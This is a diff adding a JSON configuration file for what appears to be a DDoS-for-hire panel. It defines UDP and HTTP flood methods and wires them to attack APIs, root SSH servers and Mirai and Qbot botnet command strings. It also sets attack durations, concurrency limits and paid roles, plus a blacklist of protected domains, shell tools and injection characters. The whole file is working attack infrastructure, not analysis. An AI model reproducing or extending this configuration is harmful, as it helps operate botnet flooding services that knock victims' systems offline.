@@ -1,0 +1,544 @@
+{
+    "Blacklists": {
+        "Blacklists_Targets": [
+            "0.0.0.",
+            "1.1.1.",
+            "127.0.0.",
+            "8.8.8.",
+            ".gov",
+            ".edu",
+            ".gouv",
+            "curl",
+            "wget",
+            "echo",
+            "reboot",
+            "whoami",
+            "nano",
+            "mysql",
+            "localhost",
+            "bash",
+            "root",
+            "proc",
+            "apache2",
+            "sudo",
+            "bin",
+            "etc",
+            "\\u",
+            ".sh",
+            "%0",
+            "%1",
+            "%20",
+            "%21",
+            "%22",
+            "%24",
+            "%25",
+            "%27",
+            "%28",
+            "%29",
+            "%2a",
+            "%2b",
+            "%2c",
+            "%2d",
+            "%2e",
+            "%2f",
+            "%3b",
+            "%3c",
+            "%3e",
+            "%1",
+            "%2",
+            "%3",
+            "%4",
+            "%5",
+            "%6",
+            "%7",
+            "%8",
+            "%9",
+            ";",
+            "|",
+            "[",
+            "]",
+            "<",
+            ">",
+            "{",
+            "}",
+            "+",
+            "!",
+            "~",
+            "\"",
+            "\\",
+            "$",
+            "@",
+            "(",
+            ")",
+            "`"
+        ],
+        "note": "Blacklist containing IP addresses, URLs, and domain extensions to restrict targets.",
+        "ASN_NUMBER": [
+            "AS16271"
+        ],
+        "notes": "ASN numbers that are blocked for all requests.",
+        "ASN_NAME": [
+            "OVH-SASS"
+        ],
+        "Note": "ASN names that are blocked for all requests.",
+        "Countries": [
+            "RU"
+        ],
+        "Notes": "List of country codes restricted from access."
+    },
+    "server_list": [
+        {
+            "note": "Configuration for Layer 4 server #1.",
+            "enabled": false,
+            "tag": "LAYER 4 #1",
+            "server_config": {
+                "ip": "1.1.1.1",
+                "port": 22,
+                "username": "root",
+                "password": "password"
+            }
+        },
+        {
+            "note": "Configuration for Layer 7 server #1.",
+            "enabled": false,
+            "tag": "LAYER 7 #1",
+            "server_config": {
+                "ip": "1.1.1.1",
+                "port": 22,
+                "username": "root",
+                "password": "password"
+            }
+        }
+    ],
+    "bots_list": [
+        {
+            "note": "Configuration for Layer 4 Mirai bot #1.",
+            "enabled": false,
+            "tag": "LAYER 4 Mirai #1",
+            "server_config": {
+                "ip": "1.1.1.1",
+                "port": 22,
+                "username": "root",
+                "password": "password"
+            }
+        },
+        {
+            "note": "Configuration for Layer 7 Mirai bot #1.",
+            "enabled": false,
+            "tag": "LAYER 7 Mirai #1",
+            "server_config": {
+                "ip": "1.1.1.1",
+                "port": 22,
+                "username": "root",
+                "password": "password"
+            }
+        },
+        {
+            "note": "Configuration for Layer 4 Wbot #1.",
+            "enabled": false,
+            "tag": "LAYER 4 Qbot #1",
+            "server_config": {
+                "ip": "1.1.1.1",
+                "port": 22,
+                "username": "root",
+                "password": "password"
+            }
+        },
+        {
+            "note": "Configuration for Layer 7 Qbot #1.",
+            "enabled": false,
+            "tag": "LAYER 7 Qbot #1",
+            "server_config": {
+                "ip": "1.1.1.1",
+                "port": 22,
+                "username": "root",
+                "password": "password"
+            }
+        }
+    ],
+    "Methods": [
+        {
+            "Name": "udp",
+            "Description": "Simple User Datagram Protocol vector.",
+            "note": "Settings for the 'udp' attack method.",
+            "Enabled": true,
+            "Api_Setup": [
+                {
+                    "enabled": true,
+                    "Method_Api_Name": "udp",
+                    "Link": "https://your-api.com/api/attack?username=YOUR_USERNAME_HERE&password=YOUR_PASSWORD_HERE&host={target}&port={port}&time={duration}&method={method}",
+                    "URLEncode": true,
+                    "Debugging": true,
+                    "note": "API setup for the 'udp' method."
+                }
+            ],
+            "server_methods": {
+                "enabled": false,
+                "note": "Only enable one of the two options below. ('all' or 'select')",
+                "all": {
+                    "enabled": true,
+                    "command": "screen -dmS ./udp {HOST} {PORT} {THREADS} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "servers": [
+                        {
+                            "tag": "LAYER 4 #1",
+                            "command": "screen -dmS ./udp {HOST} {PORT} 10 {TIME}",
+                            "enabled": true
+                        },
+                        {
+                            "tag": "LAYER 4 #2",
+                            "command": "screen -dmS ./udp {HOST} {PORT} {THREADS} {TIME}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "mirai_methods": {
+                "enabled": false,
+                "note": "Only enable one of the two options below. ('all' or 'select')",
+                "all": {
+                    "enabled": true,
+                    "command": ".attack UDP {HOST} {PORT} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "botnets": [
+                        {
+                            "tag": "MIRAI",
+                            "command": "udp {HOST} {PORT} {TIME}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "qbot_methods": {
+                "enabled": false,
+                "note": "Only enable one of the two options below. ('all' or 'select')",
+                "all": {
+                    "enabled": true,
+                    "command": ".attack UDP {HOST} {PORT} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "botnets": [
+                        {
+                            "tag": "QBOT",
+                            "command": ".udp {HOST} {TIME} -dport={PORT}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "Kill_Setup": {
+                "note": "to kill you can use any endpoints ! you have any exemple !",
+                "api_kill_setup": [
+                    {
+                        "enable": false,
+                        "name": "API1",
+                        "api": "https://your-api.com/stop?key=key&target=[TARGET]&time=[TIME]",
+                        "note": "API command to stop 'udp' attacks."
+                    },
+                    {
+                        "enable": false,
+                        "name": "API2",
+                        "api": "https://your-api.com/api/stop?user=username&key=key&attack_id={attack_id}",
+                        "note": "API command to stop 'udp' attacks."
+                    },
+                    {
+                        "enable": false,
+                        "name": "API3",
+                        "api": "https://your-api.com/stop?token=token&attack_id=<id>",
+                        "note": "API command to stop 'udp' attacks."
+                    },
+                    {
+                        "enable": false,
+                        "name": "API4",
+                        "api": "http://your-api.com/api/stop?username={username}&password={password}&host={target}",
+                        "note": "API command to stop 'http' attacks."
+                    }
+                ],
+                "ssh_kill_setup": [
+                    {
+                        "enable": false,
+                        "name": "udp",
+                        "command": "screen -S {HOST} -X quit",
+                        "note": "SSH command to stop 'udp' attacks."
+                    }
+                ],
+                "bot_kill_setup": [
+                    {
+                        "enable": false,
+                        "name": "udp",
+                        "command": "screen -S {HOST} -X quit",
+                        "note": "Bot command to stop 'udp' attacks."
+                    }
+                ]
+            },
+            "Management": {
+                "General": {
+                    "DefaultPort": 80,
+                    "note": "Max Concurrents on methods ONLY !",
+                    "Max_Concurrents": 5
+                },
+                "Roles_Required": {
+                    "Status_Update": false,
+                    "Holder": false,
+                    "VIP": false,
+                    "Admin": false,
+                    "Reseller": false,
+                    "Owner": false,
+                    "Private": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Defines allowed target types.",
+                        "ip_address": true,
+                        "url": false,
+                        "domain": false,
+                        "subnet": false
+                    },
+                    "method_group": {
+                        "note": "Custom Role ( config.json ) Line 114",
+                        "method_group_name": "main_network",
+                        "require_method_group_role": false
+                    },
+                    "method_min_time": {
+                        "note": "Minimum time for an attack",
+                        "time": 30,
+                        "enabled": true
+                    },
+                    "method_max_time": {
+                        "note": "Maximum time limits for attacks",
+                        "hard": {
+                            "note": "Hard limit for attack time",
+                            "time": 60,
+                            "enabled": false
+                        },
+                        "soft": {
+                            "note": "Soft limit for attack time",
+                            "time": 60,
+                            "enabled": false
+                        }
+                    },
+                    "port_settings": {
+                        "note": "¨*",
+                        "method_port_range": {
+                            "note": "Range of ports allowed for this method",
+                            "min_port": 53,
+                            "max_port": 80,
+                            "enabled": false
+                        },
+                        "method_port_whitelist": {
+                            "note": "Can use this methods only with port",
+                            "ports": [
+                                22,
+                                53
+                            ],
+                            "enabled": false
+                        }
+                    },
+                    "as_number_whitelist": {
+                        "note": "WHITELIST ASN NUMER FOR USE THIS METHODS",
+                        "enabled": false,
+                        "as_number": [
+                            "16509"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "Name": "http",
+            "Description": "Simple HTTP1.1 Flood.",
+            "note": "Settings for the 'http' attack method.",
+            "Enabled": true,
+            "Api_Setup": [
+                {
+                    "enabled": true,
+                    "Method_Api_Name": "http",
+                    "Link": "https://your-api.com/api/attack?username=YOUR_USERNAME_HERE&password=YOUR_PASSWORD_HERE&host={target}&port={port}&time={duration}&method={method}",
+                    "URLEncode": true,
+                    "Debugging": true,
+                    "note": "API setup for the 'http' method."
+                }
+            ],
+            "server_methods": {
+                "enabled": false,
+                "note": "Only enable one of the two options below. ('all' or 'select')",
+                "all": {
+                    "enabled": true,
+                    "command": "screen -dmS ./HTTP {HOST} {PORT} 10 {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "servers": [
+                        {
+                            "tag": "LAYER 4 #1",
+                            "command": "screen -dmS ./HTTP {HOST} {PORT} 10 {TIME}",
+                            "enabled": true
+                        },
+                        {
+                            "tag": "LAYER 4 #2",
+                            "command": "screen -dmS ./HTTP {HOST} {PORT} 50 {TIME}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "mirai_methods": {
+                "enabled": false,
+                "note": "Only enable one of the two options below. ('all' or 'select')",
+                "all": {
+                    "enabled": true,
+                    "command": ".attack HTTP {HOST} {PORT} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "botnets": [
+                        {
+                            "tag": "MIRAI",
+                            "command": "HTTP {HOST} {PORT} {TIME}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "qbot_methods": {
+                "enabled": false,
+                "note": "Only enable one of the two options below. ('all' or 'select')",
+                "all": {
+                    "enabled": true,
+                    "command": ".attack HTTP {HOST} {PORT} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "botnets": [
+                        {
+                            "tag": "QBOT",
+                            "command": ".HTTP {HOST} {TIME} -dport={PORT}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "Kill_Setup": {
+                "api_kill_setup": [
+                    {
+                        "enable": false,
+                        "name": "API1",
+                        "api": "https://your-api.com/stop?key=key&target=[TARGET]&time=[TIME]",
+                        "note": "API command to stop 'udp' attacks."
+                    },
+                    {
+                        "enable": false,
+                        "name": "API2",
+                        "api": "https://your-api.com/api/stop?user=username&key=key&attack_id={attack_id}",
+                        "note": "API command to stop 'udp' attacks."
+                    },
+                    {
+                        "enable": false,
+                        "name": "API3",
+                        "api": "https://your-api.com/stop?token=token&attack_id=<id>",
+                        "note": "API command to stop 'udp' attacks."
+                    },
+                    {
+                        "enable": false,
+                        "name": "API4",
+                        "api": "http://your-api.com/api/stop?username={username}&password={password}&host={target}",
+                        "note": "API command to stop 'http' attacks."
+                    }
+                ],
+                "ssh_kill_setup": [
+                    {
+                        "enable": false,
+                        "name": "HTTP",
+                        "command": "screen -S {HOST} -X quit",
+                        "note": "SSH command to stop 'http' attacks."
+                    }
+                ],
+                "bot_kill_setup": [
+                    {
+                        "enable": false,
+                        "name": "¨HTTP",
+                        "command": "screen -S {HOST} -X quit",
+                        "note": "Bot command to stop 'http' attacks."
+                    }
+                ]
+            },
+            "Management": {
+                "General": {
+                    "DefaultPort": 443,
+                    "note": "Max Concurrents on methods ONLY !",
+                    "Max_Concurrents": 5
+                },
+                "Roles_Required": {
+                    "Status_Update": false,
+                    "Holder": false,
+                    "VIP": false,
+                    "Admin": false,
+                    "Reseller": false,
+                    "Owner": false,
+                    "Private": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Defines allowed target types.",
+                        "ip_address": false,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false
+                    },
+                    "method_group": {
+                        "note": "Custom Role ( config.json ) Line 114",
+                        "method_group_name": "layer_7",
+                        "require_method_group_role": false
+                    },
+                    "method_min_time": {
+                        "note": "Minimum time for an attack",
+                        "time": 30,
+                        "enabled": true
+                    },
+                    "method_max_time": {
+                        "note": "Maximum time limits for attacks",
+                        "hard": {
+                            "note": "Hard limit for attack time",
+                            "time": 60,
+                            "enabled": false
+                        },
+                        "soft": {
+                            "note": "Soft limit for attack time",
+                            "time": 60,
+                            "enabled": true
+                        }
+                    },
+                    "port_settings": {
+                        "note": "¨*",
+                        "method_port_range": {
+                            "note": "*",
+                            "min_port": 53,
+                            "max_port": 80,
+                            "enabled": false
+                        },
+                        "method_port_whitelist": {
+                            "note": "Can use this methods only with port",
+                            "ports": [
+                                22,
+                                53
+                            ],
+                            "enabled": false
+                        }
+                    },
+                    "as_number_whitelist": {
+                        "note": "WHITELIST ASN NUMER FOR USE THIS METHODS",
+                        "enabled": false,
+                        "as_number": [
+                            "16509"
+                        ]
+                    }
+                }
+            }
+        }
+    ]
+}
